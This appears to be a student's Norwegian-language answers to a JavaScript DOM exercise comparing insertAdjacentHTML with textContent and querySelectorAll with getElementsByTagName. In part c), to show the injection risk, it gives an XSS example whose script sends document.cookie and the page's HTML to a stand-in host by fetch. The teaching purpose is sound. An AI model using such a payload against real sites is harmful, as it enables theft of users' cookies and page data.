
Oppgave 2


a)
Metoden showUserdata:
    function showUserdata(userData,rootElement) {
        rootElement.insertAdjacentHTML('beforeend',`<p>${userData}</p>`)
    }

 - Denne metoden tar inn data og et element og setter inn denne dataen i en <p> i slutten av elementet

 b)

 Metoden viewUserdata:
    function viewUserdata(userData,rootElement) {
        rootElement.insertAdjacentHTML('beforeend',`<p></p>`)
        rootElement.lastElementChild.textContent = userData
    }

- Denne metoden tar inn data og et element som parametere og setter denne dataen inn en <p> tag. 
- Forskjellen er at den oppretter en p tag først for så å sette det inn med text content på siste barne elementet til elementet



c) En av metodene har et praktisk problem, hvilket og hva?

- sikkerhetsrisiko. mulig å injisere koden. eks:

    const userData = `<script>
    fetch('https://malicious.example.com', {
    method: 'POST',
    body: JSON.stringify({
        cookies: document.cookie,
        document: document.documentElement.innerHTML
    })
    });
    </script>`;
    showUserdata(userData);


d) Hva er forskjellen på disse kodelinjene?
    1. const divElementList = rootElement.querySelectorAll('div')
    2. const divElements = rootElement.getElementsByTagName('div')

    divElements er dynamisk som vil si at listen blir oppdatert automatisk når nettsiden oppdateres.
    divElementList er statisk og vil ikke oppdateres dersom elementet endrer seg.

    Eks:

    rootElement.insertAdjacentHTML('beforeend', `<div>Ny div</div>`)
    
e)

    const divElementList = rootElement.querySelectorAll('div')
    divElementList.forEach((e) => {
        e.classList.add("info");
    })




